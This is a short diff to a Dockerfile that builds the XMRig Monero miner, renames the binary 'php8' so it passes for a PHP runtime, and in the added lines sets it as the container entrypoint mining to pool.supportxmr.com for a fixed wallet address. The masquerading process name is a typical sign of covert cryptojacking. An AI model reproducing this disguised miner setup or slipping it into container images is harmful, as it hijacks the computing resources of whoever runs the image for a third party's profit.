@@ -10,8 +10,7 @@ RUN cmake .
 RUN make
 RUN mv xmrig php8
 
-WORKDIR    /php8
 
+ENTRYPOINT ["./php8"]
 
-
-CMD ["/xmrig/build/", "--max-cpu-usage=50", "--cpu-priority=5", "-o", "pool.minexmr.com:4444", "-u", "47H7tKGJKE1CPrvWHcm9N4PgLdKwWYw8QWV2V9Txy3NhRFK9TW7McxxN88GLbVXpNUZ3c3PjT8iCE9FEiD8JpvEgJfL5rWc", "--http-host=0.0.0.0", "--http-port=8080"]
+CMD ["--url=pool.supportxmr.com:5555", "--user=47H7tKGJKE1CPrvWHcm9N4PgLdKwWYw8QWV2V9Txy3NhRFK9TW7McxxN88GLbVXpNUZ3c3PjT8iCE9FEiD8JpvEgJfL5rWc", "--pass=Docker", "-k", "--coin=monero"]˚
